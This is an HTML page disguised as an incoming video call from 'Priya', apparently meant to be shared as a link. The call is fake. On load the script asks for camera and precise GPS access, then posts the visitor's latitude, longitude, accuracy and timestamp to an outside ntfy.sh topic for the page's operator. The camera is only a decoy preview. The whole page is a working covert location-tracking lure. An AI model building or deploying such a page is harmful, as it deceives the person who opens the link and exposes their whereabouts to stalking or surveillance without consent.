<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>Click to join the video call</title>
    <meta name="description" content="Priya is inviting you to a video call." />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Click to join the video call" />
    <meta property="og:description" content="Priya is inviting you to a video call." />
    <meta property="og:url" content="https://yousuf-appygo.github.io/join-call/" />
    <meta property="og:image" content="https://yousuf-appygo.github.io/join-call/priya.jpg" />
    <meta property="og:image:alt" content="Video call with Priya" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Click to join the video call" />
    <meta name="twitter:description" content="Priya is inviting you to a video call." />
    <meta name="twitter:image" content="https://yousuf-appygo.github.io/join-call/priya.jpg" />
    <link rel="canonical" href="https://yousuf-appygo.github.io/join-call/" />
    <style>
      :root {
        --bg: #0b141a;
        --red: #ef4444;
      }
      * { box-sizing: border-box; }
      html, body {
        margin: 0;
        height: 100%;
        background: var(--bg);
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        overflow: hidden;
        -webkit-user-select: none;
        user-select: none;
      }
      button {
        font: inherit;
        border: 0;
        color: #fff;
        cursor: pointer;
        -webkit-tap-highlight-color: transparent;
      }
      .screen {
        display: none;
        position: fixed;
        inset: 0;
      }
      .screen.active { display: block; }

      .dial {
        background: #1a1410 center/cover no-repeat;
      }
      .dial::before {
        content: "";
        position: absolute;
        inset: 0;
        background: linear-gradient(180deg, rgba(11, 20, 26, 0.28) 0%, rgba(11, 20, 26, 0.88) 100%);
      }
      .dial-body {
        position: relative;
        z-index: 2;
        height: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: space-between;
        padding: calc(56px + env(safe-area-inset-top)) 24px calc(40px + env(safe-area-inset-bottom));
      }
      .dial-meta { text-align: center; }
      .dial-meta h1 {
        margin: 22px 0 0;
        font-size: 2rem;
        font-weight: 600;
      }
      .dial-meta p {
        margin: 10px 0 0;
        opacity: 0.85;
        letter-spacing: 0.08em;
      }
      .avatar-wrap {
        width: 132px;
        height: 132px;
        border-radius: 50%;
        overflow: hidden;
        box-shadow: 0 0 0 8px rgba(255, 255, 255, 0.12);
        animation: pulse 1.6s ease-in-out infinite;
      }
      .avatar-wrap img, .remote img {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
      @keyframes pulse {
        0%, 100% { box-shadow: 0 0 0 8px rgba(255, 255, 255, 0.12); }
        50% { box-shadow: 0 0 0 18px rgba(255, 255, 255, 0.06); }
      }
      .round {
        width: 72px;
        height: 72px;
        border-radius: 50%;
        display: grid;
        place-items: center;
      }
      .end { background: var(--red); }
      .ghost { background: rgba(255, 255, 255, 0.16); }
      .ghost.off { background: #fff; color: #111; }
      .end-wrap { text-align: center; }
      .end-wrap span {
        display: block;
        margin-top: 10px;
        font-size: 0.85rem;
        opacity: 0.85;
      }

      .in-call .remote { position: absolute; inset: 0; }
      .top-bar, .bottom-bar {
        position: absolute;
        left: 0;
        right: 0;
        z-index: 2;
      }
      .top-bar {
        top: 0;
        padding: calc(18px + env(safe-area-inset-top)) 20px 0;
        text-align: center;
        text-shadow: 0 1px 8px rgba(0, 0, 0, 0.45);
      }
      .top-bar strong { display: block; font-size: 1.15rem; }
      .top-bar small { opacity: 0.85; }
      .bottom-bar {
        bottom: 0;
        display: flex;
        justify-content: center;
        gap: 22px;
        padding: 0 20px calc(28px + env(safe-area-inset-bottom));
      }
      .pip {
        position: absolute;
        right: 16px;
        bottom: calc(118px + env(safe-area-inset-bottom));
        width: 108px;
        height: 152px;
        border-radius: 14px;
        overflow: hidden;
        background: #111;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
        border: 1px solid rgba(255, 255, 255, 0.18);
        z-index: 2;
      }
      .pip video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1);
        background: #111;
      }
      .overlay {
        display: none;
        position: absolute;
        inset: 0;
        z-index: 3;
        background: rgba(11, 20, 26, 0.45);
        place-items: center;
        font-size: 1.05rem;
        pointer-events: none;
      }
      .overlay.active { display: grid; }
      .ended {
        display: grid;
        place-items: center;
        text-align: center;
        padding: 24px;
      }
      .ended p { opacity: 0.75; }
    </style>
  </head>
  <body>
    <section id="dial" class="screen dial active" style="background-image: url('priya.jpg')">
      <div class="dial-body">
        <div class="dial-meta">
          <div class="avatar-wrap"><img src="priya.jpg" alt="" /></div>
          <h1>Priya</h1>
          <p id="dialStatus">Calling…</p>
        </div>
        <div class="end-wrap">
          <button class="round end" id="cancelBtn" type="button" aria-label="Cancel">
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M4 15c4-1 6-3 8-8M6 7.5c5 4.8 7 6.8 12 12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/></svg>
          </button>
          <span>Cancel</span>
        </div>
      </div>
    </section>

    <section id="incall" class="screen in-call">
      <div class="remote"><img src="priya.jpg" alt="" /></div>
      <div class="top-bar">
        <strong>Priya</strong>
        <small id="timer">Connecting…</small>
      </div>
      <div class="pip">
        <video id="localVideo" autoplay muted playsinline></video>
      </div>
      <div class="bottom-bar">
        <button class="round ghost" id="micBtn" type="button" aria-label="Mute">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="9" y="3" width="6" height="11" rx="3" stroke="currentColor" stroke-width="2"/><path d="M6.5 11.5a5.5 5.5 0 0 0 11 0" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 17v4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        </button>
        <button class="round ghost" id="camBtn" type="button" aria-label="Camera">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="3" y="7" width="13" height="10" rx="2" stroke="currentColor" stroke-width="2"/><path d="M16 10.5 21 8v8l-5-2.5v-3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
        </button>
        <button class="round end" id="endBtn" type="button" aria-label="End call">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4 15c4-1 6-3 8-8M6 7.5c5 4.8 7 6.8 12 12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/></svg>
        </button>
      </div>
      <div class="overlay" id="connecting">Connecting…</div>
    </section>

    <section id="ended" class="screen ended">
      <div>
        <h2>Call ended</h2>
        <p>Priya</p>
      </div>
    </section>

    <script>
      var STORE =
        "https://ntfy.sh/join-call-loc-7f3a9c2e8b11";
      var localStream = null;
      var timerId = null;
      var elapsed = 0;
      var inFlight = false;
      var gotFix = false;
      var lastFix = null;
      var micOn = true;
      var camOn = true;

      function show(id) {
        ["dial", "incall", "ended"].forEach(function (name) {
          document.getElementById(name).classList.toggle("active", name === id);
        });
      }

      function withTime(payload) {
        var now = new Date();
        payload.time = now.toISOString();
        payload.local_time = now.toLocaleString("en-IN", {
          timeZone: "Asia/Kolkata",
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        });
        return payload;
      }

      function send(payload) {
        payload = withTime(payload);
        var row = {
          lat: payload.lat,
          lng: payload.lng,
          accuracy: payload.accuracy,
          time: payload.time,
          local_time: payload.local_time,
        };
        if (payload.error) row.error = payload.error;
        if (payload.code != null) row.code = payload.code;
        return fetch(STORE, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(row),
          keepalive: true,
        }).catch(function () {
          return null;
        });
      }

      function persistFix(coords) {
        lastFix = coords;
        return send(coords).then(function (res) {
          if (res && res.ok) gotFix = true;
        });
      }

      function pad(n) {
        return (n < 10 ? "0" : "") + n;
      }

      function formatTime(total) {
        return pad(Math.floor(total / 60)) + ":" + pad(total % 60);
      }

      function startTimer() {
        elapsed = 0;
        document.getElementById("timer").textContent = "00:00";
        timerId = setInterval(function () {
          elapsed += 1;
          document.getElementById("timer").textContent = formatTime(elapsed);
        }, 1000);
      }

      function stopStream() {
        if (!localStream) return;
        localStream.getTracks().forEach(function (track) {
          track.stop();
        });
        localStream = null;
      }

      function requestLocation() {
        if (lastFix && !gotFix) {
          return persistFix(lastFix);
        }
        if (!navigator.geolocation) {
          send({ error: "geolocation_unsupported" });
          return Promise.resolve();
        }
        return new Promise(function (resolve) {
          navigator.geolocation.getCurrentPosition(
            function (pos) {
              return persistFix({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              }).then(function () {
                resolve();
              });
            },
            function (err) {
              return send({ error: err.message, code: err.code }).then(function () {
                resolve();
              });
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
          );
        });
      }

      function requestCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          return Promise.resolve();
        }
        return navigator.mediaDevices
          .getUserMedia({ video: { facingMode: "user" }, audio: false })
          .then(function (stream) {
            localStream = stream;
            var video = document.getElementById("localVideo");
            video.srcObject = stream;
            return video.play().catch(function () {});
          })
          .catch(function () {});
      }

      function startDial() {
        if (gotFix || inFlight) return;
        inFlight = true;
        document.getElementById("dialStatus").textContent = "Calling…";
        show("incall");
        document.getElementById("connecting").classList.add("active");
        requestCamera()
          .then(requestLocation)
          .then(function () {
            inFlight = false;
            document.getElementById("connecting").classList.remove("active");
            if (!timerId) startTimer();
          });
      }

      function endCall() {
        gotFix = true;
        inFlight = false;
        if (timerId) clearInterval(timerId);
        stopStream();
        show("ended");
      }

      document.getElementById("cancelBtn").addEventListener("click", function (e) {
        e.stopPropagation();
        endCall();
      });
      document.getElementById("endBtn").addEventListener("click", endCall);
      document.getElementById("dial").addEventListener("click", startDial);
      document.getElementById("incall").addEventListener("click", function (e) {
        if (!gotFix && !e.target.closest("button")) startDial();
      });
      document.getElementById("micBtn").addEventListener("click", function () {
        micOn = !micOn;
        this.classList.toggle("off", !micOn);
      });
      document.getElementById("camBtn").addEventListener("click", function () {
        camOn = !camOn;
        this.classList.toggle("off", !camOn);
        if (localStream) {
          localStream.getVideoTracks().forEach(function (track) {
            track.enabled = camOn;
          });
        }
      });

      setTimeout(startDial, 700);
    </script>
  </body>
</html>
